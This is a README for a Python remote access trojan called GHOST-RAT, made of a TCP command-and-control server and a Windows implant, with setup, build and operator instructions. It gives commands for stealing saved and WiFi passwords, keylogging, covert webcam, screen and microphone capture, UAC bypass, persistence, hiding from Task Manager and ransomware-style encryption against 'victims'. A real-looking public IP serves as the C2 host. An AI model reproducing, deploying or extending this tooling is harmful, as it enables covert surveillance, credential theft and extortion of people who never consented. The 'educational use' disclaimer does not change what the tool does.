# GHOST-RAT C2 Framework

A comprehensive Command & Control (C2) framework consisting of a lightweight TCP-based C2 server and a feature-rich Windows implant. Designed for educational purposes and penetration testing.

## 🚀 Features

### C2 Server (`quick_c2.py`)
- **JSON-over-TCP Protocol** - Lightweight and efficient communication
- **Multi-victim Management** - Handle multiple connected targets simultaneously
- **Real-time Command Execution** - Send commands and receive results instantly
- **File Transfer** - Upload/download files to/from targets
- **Task Queue System** - Queue commands for offline targets
- **Cross-platform Server** - Runs on Windows, Linux, macOS

### Implant (`ghost.py`)
- **Media Capture** - Screenshots, webcam photos/videos, audio recording
- **System Information** - OS details, user info, network configuration
- **File Operations** - Directory listing, file download, navigation
- **Network Reconnaissance** - WiFi password extraction, network scanning
- **Stealth Features** - Console hiding, process hiding, persistence
- **Keylogger** - Capture keystrokes in real-time
- **Remote Shell** - Execute system commands remotely
- **Ransomware Simulation** - File encryption/decryption for testing
- **Anti-VM Detection** - Detect virtual environments
- **UAC Bypass** - Privilege escalation techniques

## 📋 Requirements

### Server Requirements
- Python 3.8+
- Network connectivity (local or internet)

### Target Requirements (for .py version)
- Windows 10/11
- Python 3.8+ with required libraries
- Network connectivity to C2 server

### Target Requirements (for .exe version)
- Windows 10/11 (any edition)
- No additional software required

## 🛠️ Installation & Setup

### 1. Clone Repository
```bash
git clone <repository-url>
cd ghost-c2
```

### 2. Install Dependencies
```bash
pip install -r requirements.txt
```

### 3. Configure C2 Server
Edit `ghost.py` configuration:
```python
# C2 Server Configuration
USE_QUICK_C2 = True
QUICK_C2_HOST = "YOUR_PUBLIC_IP"  # Change to your server IP
QUICK_C2_PORT = 8443
```

### 4. Network Configuration

#### For Local Network Testing
- Use your local IP (e.g., `192.168.1.100`)
- Ensure firewall allows port 8443

#### For Internet Deployment
- Use your public IP address
- Configure router port forwarding: `8443 → YOUR_LOCAL_IP:8443`
- Configure Windows Firewall:
  ```cmd
  netsh advfirewall firewall add rule name="C2_Server_8443" dir=in action=allow protocol=TCP localport=8443
  ```

## 🔨 Building the Executable

### Quick Build
```bash
# Windows
build.bat

# Cross-platform
python build.py

# Manual PyInstaller
pyinstaller ghost.spec
```

### Build Output
- **Location**: `dist/ghost.exe`
- **Size**: ~80MB (includes all dependencies)
- **Compatibility**: Any Windows 10/11 machine
- **Dependencies**: None (fully portable)

## 🎯 Usage

### 1. Start C2 Server
```bash
python quick_c2.py
```
Server will listen on `0.0.0.0:8443`

### 2. Deploy Implant

#### Method A: Python Script (requires Python on target)
```bash
python ghost.py
```

#### Method B: Standalone Executable (recommended)
```bash
ghost.exe
```

### 3. C2 Server Commands

#### Basic Commands
```bash
c2> list                          # List all connected victims
c2> status                        # Show server status
c2> use GHOST-PC-ABC123          # Select a victim
c2> info                         # Show victim information
c2> tasks                        # Show queued tasks
c2> clear                        # Clear queued tasks for selected victim
c2> clearall                     # Clear queued tasks for all victims
c2> help                         # Show help menu
```

#### Victim Commands
```bash
# System Information
c2> send /status                 # System status and info
c2> send /shell whoami          # Execute shell command

# File Operations
c2> send /ls                    # List current directory
c2> send /ls C:\Users           # List specific directory
c2> send /cd C:\Windows         # Change directory
c2> send /dl important.txt      # Download file

# Media Capture
c2> send /screenshot            # Take 1 screenshot (default)
c2> send /screenshot 5          # Take 5 screenshots
c2> send /video                 # Record 30-second video (default)
c2> send /video 60              # Record 60-second video
c2> send /video 120             # Record 2-minute video
c2> send /pic                   # Take webcam photo
c2> send /webcam               # Take webcam photo (same as /pic)
c2> send /mic                  # Record audio

# Network & Credentials
c2> send /wifi                 # Extract WiFi passwords
c2> send /pass                 # Extract saved passwords

# Advanced Features
c2> send /keylog               # Start keylogger
c2> send /stop                 # Stop all monitoring
c2> send /admin                # Attempt UAC bypass
```

#### File Transfer
```bash
c2> upload local_file.txt remote_file.txt    # Upload file to victim
```

#### Broadcast Commands
```bash
c2> broadcast /screenshot       # Send command to all victims
```

## 📁 Project Structure

```
ghost-c2/
├── ghost.py              # Main implant source code
├── quick_c2.py          # C2 server
├── requirements.txt     # Python dependencies
├── ghost.spec          # PyInstaller configuration
├── build.bat           # Windows build script
├── build.py            # Cross-platform build script
├── BUILD_INSTRUCTIONS.md # Detailed build guide
├── README.md           # This file
├── dist/               # Built executables
│   └── ghost.exe      # Compiled implant
└── build/             # Build artifacts
```

## 🔧 Configuration Options

### Transport Configuration
```python
# Use TCP C2 (recommended)
USE_QUICK_C2 = True
QUICK_C2_HOST = "154.68.72.81"  # Your server IP
QUICK_C2_PORT = 8443

# Legacy Discord transport (deprecated)
USE_QUICK_C2 = False
DISCORD_TOKEN = "your_bot_token"
```

### Feature Toggles
```python
# Media features (requires libraries)
has_media = True    # Screenshots, webcam, audio

# Keylogger (requires pynput)
has_keylogger = True

# Stealth features
HIDE_CONSOLE = True
BLOCK_TASK_MANAGER = True
```

## 🛡️ Security Features

### Implant Security
- **Console Hiding** - No visible windows
- **Process Hiding** - Difficult to detect in task manager
- **Anti-VM Detection** - Detects virtual environments
- **SSL Bypass** - Handles certificate issues
- **Persistence** - Survives reboots (optional)

### C2 Security
- **Length-prefixed Protocol** - Prevents message corruption
- **JSON Communication** - Structured and reliable
- **Connection Resilience** - Auto-reconnection on disconnect
- **Multi-client Support** - Handle many victims simultaneously

## 🔍 Troubleshooting

### Common Issues

#### "Media libraries not available"
**Problem**: Target missing Python media libraries
**Solution**: Use the compiled `.exe` version instead of `.py`

#### "Connection refused"
**Problem**: C2 server not reachable
**Solutions**:
- Check if C2 server is running
- Verify IP address and port configuration
- Check firewall settings
- Confirm port forwarding (for internet deployment)

#### "Unknown command"
**Problem**: Sending commands without selecting victim
**Solution**: Use `use VICTIM_ID` before sending commands

#### Large executable size
**Problem**: `ghost.exe` is ~80MB
**Explanation**: Normal for PyInstaller builds with many dependencies

### Debug Information
- **Logs**: Check `ghost_monitor.log` on target's Desktop
- **Temp Files**: Screenshots/videos saved in `%TEMP%` directory
- **Connection Status**: Use `send /status` to check implant health

## ⚖️ Legal Disclaimer

**IMPORTANT**: This tool is for educational and authorized penetration testing purposes only.

- ✅ **Authorized Use**: Security research, penetration testing with permission, educational purposes
- ❌ **Unauthorized Use**: Accessing systems without permission, malicious activities, illegal surveillance

**Users are solely responsible for ensuring their use complies with applicable laws and regulations.**

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📝 Changelog

### v2.0 (Current)
- Added TCP-based C2 server
- Improved media capture capabilities
- Enhanced stealth features
- Standalone executable support
- Cross-network deployment

### v1.0 (Legacy)
- Discord-based transport
- Basic command execution
- Screenshot capabilities

## 🔗 Related Documentation

- [BUILD_INSTRUCTIONS.md](BUILD_INSTRUCTIONS.md) - Detailed build guide
- [requirements.txt](requirements.txt) - Python dependencies
- [ghost.spec](ghost.spec) - PyInstaller configuration

## 📞 Support

For issues, questions, or contributions:
1. Check existing documentation
2. Review troubleshooting section
3. Create an issue with detailed information
4. Include logs and error messages

---

**Remember**: Always use responsibly and within legal boundaries. 🛡️